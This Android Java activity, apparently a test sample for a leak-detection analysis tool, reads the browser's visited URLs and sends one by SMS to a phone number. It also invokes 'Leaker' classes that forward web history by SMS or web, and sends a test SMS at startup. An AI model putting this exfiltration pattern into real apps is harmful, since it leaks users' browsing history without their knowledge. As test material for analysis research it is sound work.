package SampleApp.src.com.example.sampleapp;

import java.util.ArrayList;
import java.util.List;

import SampleApp.gen.com.example.sampleapp.R;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;

public class MainActivity extends Activity {
	
	private class MultipleUIClasses implements View.OnClickListener, View.OnLongClickListener {
		public void onClick(View v) {
			System.out.println("Inside onClick");
		}
		
		public boolean onLongClick(View v) {
			System.out.println("Inside onLongClick");
			return false;
		}
	}
	
    // Location event handler
	private class LocationHandler implements LocationListener {
		public void onLocationChanged(Location location) {
			System.out.println("Location changed!");
		}
		
		public void onProviderDisabled(String provider) {
			System.out.println("Provider disabled!");
		}
		
		public void onProviderEnabled(String provider) {
			System.out.println("Provider enabled!");
		}
		
		public void onStatusChanged(String provider, int status, Bundle extras) {
			System.out.println("Status changed!");
		}
	}
    
	
	private View.OnLongClickListener multipleListener = new MultipleUIClasses();
	
	List<String> mWebHistory;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        mWebHistory = new ArrayList<String>();
        mWebHistory.add("http://test.url.com");
        
        // Using LocationHandler
        LocationManager locationManager = (LocationManager)getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        locationManager.requestLocationUpdates("GPS", 5, 50, new LocationHandler());
        
        // Getting web history
        LinearLayout layout = (LinearLayout)findViewById(R.layout.activity_main);
        final Button btnGetWebHistory = new Button(this);
        btnGetWebHistory.setOnClickListener(getWebHistory);
        layout.addView(btnGetWebHistory);

        // Leak information to the web
        Button btnLeakToWeb = new Button(this);
        btnLeakToWeb.setOnClickListener(leakToWebDirectly);
        layout.addView(btnLeakToWeb);

        // Testing inner OnClickListener class
        View.OnClickListener testListener = new View.OnClickListener() {
			public void onClick(View v) {
				System.out.println("Test onClick Listener!");
				btnGetWebHistory.setOnClickListener(getWebHistory);
			}
		};
		btnGetWebHistory.setOnClickListener(testListener);
        
		// Testing UI listener class that implements multiple interfaces
        multipleListener = new MultipleUIClasses();
		btnGetWebHistory.setOnLongClickListener(multipleListener);

		// Testing leak class when declared type is a parent class
    	Leaker webLeaker = new WebHistoryToSmsLeaker(getContentResolver());
    	webLeaker.leak();
    	
    	// Testing leak class using a method to get the class
    	getLeaker().leak();
    	
    	// Testing intents
        Button btnNewIntent = new Button(this);
        btnLeakToWeb.setOnClickListener(new View.OnClickListener() {			
			public void onClick(View v) {
				Intent newIntent = new Intent(MainActivity.this, SecondActivity.class);
				startActivity(newIntent);
			}
		});
        layout.addView(btnNewIntent);

        // Testing possible malicious behaviour
    	android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
    	smsManager.sendTextMessage("+12345", null, "This is a test SMS", null, null);
    }
    
    public void onStart() {
    	super.onStart();
    	System.out.println("Inside onStart");
    	
    	try {
    		// Web access
	    	HttpClient httpclient = new DefaultHttpClient();
	    	HttpPost httppost = new HttpPost("http://www.google.com");
	    	HttpResponse httpresp = httpclient.execute(httppost);
	    	System.out.println("Response: " + httpresp.toString());
    	} catch (Exception E) {
    		
    	}
    }
    
    public void onRestart() {
    	super.onRestart();
    	System.out.println("Inside onRestart");
    	extraMethod1();
    	extraMethod2(1);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        //getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
    
    public void leakToSMS(View view) {    	
    	// Add first url to text message and send
    	Log.i("leakToSMS", mWebHistory.get(0));
    	android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
    	smsManager.sendTextMessage("+14161234567", null, mWebHistory.get(0), null, null);
    }
    
    public void leakToSMSDirectly(View view) {
    	Leaker leaker = new WebHistoryToSmsLeaker(getContentResolver());
    	System.out.println("Using class: "+ leaker.getName());
    	leaker.leak();
    }
    
      
    // UI event handlers
    
    private View.OnClickListener getWebHistory = new View.OnClickListener() {
	    public void onClick(View view) {
	    	mWebHistory = new ArrayList<String>();
	    	Cursor urlCursor = android.provider.Browser.getAllVisitedUrls(getContentResolver());
	    	
	    	if (urlCursor!= null) {
	    		int urlIndex = urlCursor.getColumnIndex(android.provider.Browser.BookmarkColumns.URL);
	    		
	    		while (urlCursor.moveToNext()) {
	    			String currentUrl = urlCursor.getString(urlIndex);
	    			mWebHistory.add(currentUrl);
	    			Log.i("MainActivity", currentUrl);
	    		}
	    	}
	    }
    };
    
    private View.OnClickListener leakToWebDirectly = new View.OnClickListener() {
	    public void onClick(View view) {
	    	Leaker webLeaker = new WebHistoryToWebLeaker(getContentResolver());
	    	//Leaker webLeaker = getLeaker();
	    	System.out.println("Using class: "+ webLeaker.getName());
	    	webLeaker.leak();
	    }
    };
    
    
    private Leaker getLeaker() {
    	return new WebHistoryToSmsLeaker(getContentResolver());
    }
    
    private void extraMethod1() {
    	System.out.println("In extraMethod1");
    }
    
    private int extraMethod2(int x) {
    	System.out.println("In extraMethod2");
    	return (x + 1);
    }
}

